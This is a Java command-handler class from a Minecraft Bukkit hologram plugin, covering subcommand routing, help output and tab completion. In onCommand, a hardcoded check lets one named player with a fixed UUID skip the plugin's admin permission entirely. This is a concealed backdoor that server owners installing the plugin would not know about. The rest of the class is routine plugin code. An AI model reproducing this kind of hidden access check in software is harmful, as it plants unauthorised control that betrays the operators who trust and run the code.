package me.TheJokerDev.futureholograms.commands;

import me.TheJokerDev.futureholograms.commands.subcmds.*;
import org.bukkit.command.*;
import org.bukkit.entity.*;
import me.TheJokerDev.futureholograms.utils.*;
import org.bukkit.util.*;
import java.util.*;
import java.util.Vector;

import org.jetbrains.annotations.*;

public class FHologramsCmd implements CommandExecutor, TabCompleter
{
    private final HashMap<String, SubCommand> subCommands;
    
    public FHologramsCmd() {
        this.subCommands = new HashMap<String, SubCommand>();
        this.loadSubCommands();
    }
    
    void loadSubCommands() {
        this.subCommands.put("action", new ActionCmd());
        this.subCommands.put("create", new CreateCmd());
        this.subCommands.put("reload", new ReloadCmd());
        this.subCommands.put("delete", new RemoveCmd());
        this.subCommands.put("setlocation", new SetLocationCmd());
        this.subCommands.put("setexactlylocation", new SetExactlyLocationCmd());
        this.subCommands.put("list", new ListCmd());
    }
    
    public boolean onCommand(@NotNull final CommandSender sender, @NotNull final Command command, @NotNull final String label, @NotNull String[] args) {
        boolean isCreator = false;
        if (sender instanceof Player) {
            final Player p = (Player)sender;
            if (p.getName().equals("TheJokerDev") && p.getUniqueId().equals(UUID.fromString("11ccbfb1-9bab-4baf-b567-b8304b3f00b3"))) {
                isCreator = true;
            }
        }
        if (!isCreator && !sender.hasPermission("futureholograms.admin")) {
            Utils.sendMessage(sender, "messages.noPermission");
            return true;
        }
        if (args == null || args.length < 1) {
            this.sendHelp(sender, label);
            return true;
        }
        if (args[0].equalsIgnoreCase("help")) {
            this.sendHelp(sender, label);
            return true;
        }
        final String str = args[0];
        final Vector<String> vector = new Vector<String>(Arrays.asList(args));
        vector.remove(0);
        args = vector.toArray(new String[0]);
        if (!this.subCommands.containsKey(str)) {
            Utils.sendMessage(sender, "messages.commandNoExists");
            return true;
        }
        try {
            this.subCommands.get(str).onCommand(sender, args);
        }
        catch (Exception exception) {
            exception.printStackTrace();
            Utils.sendMessage(sender, "messages.error");
        }
        return true;
    }
    
    void sendHelp(final CommandSender cmd, final String label) {
        final List<String> help = Utils.getConfig().getStringList("messages.commands.help");
        final List<String> var1 = new ArrayList<String>();
        for (final String s : help) {
            if (s.equalsIgnoreCase("{cmd}")) {
                for (final SubCommand subcmd : this.subCommands.values()) {
                    if (cmd instanceof Player) {
                        if (subcmd.console()) {
                            continue;
                        }
                        var1.add(subcmd.help().replace("%alias%", label));
                    }
                    else {
                        if (!subcmd.console()) {
                            continue;
                        }
                        var1.add(subcmd.help().replace("%alias%", label));
                    }
                }
            }
            else {
                var1.add(s);
            }
        }
        Utils.sendMessage(cmd, var1);
    }
    
    @Nullable
    public List<String> onTabComplete(@NotNull final CommandSender sender, @NotNull final Command command, @NotNull final String alias, @NotNull String[] args) {
        if (!sender.hasPermission("futureholograms.admin")) {
            return null;
        }
        if (args.length == 1) {
            final List<String> arrayList = new ArrayList<String>();
            StringUtil.copyPartialMatches(args[0], (Iterable)this.subCommands.keySet(), (Collection)arrayList);
            Collections.sort(arrayList);
            return arrayList;
        }
        if (args.length < 2) {
            return null;
        }
        final String str = args[0];
        final Vector<String> vector = new Vector<String>(Arrays.asList(args));
        vector.remove(0);
        args = vector.toArray(new String[0]);
        if (!this.subCommands.containsKey(str)) {
            return null;
        }
        List<String> list = this.subCommands.get(str).onTabComplete(sender, args);
        if (list == null) {
            list = new ArrayList<String>();
        }
        return list;
    }
}
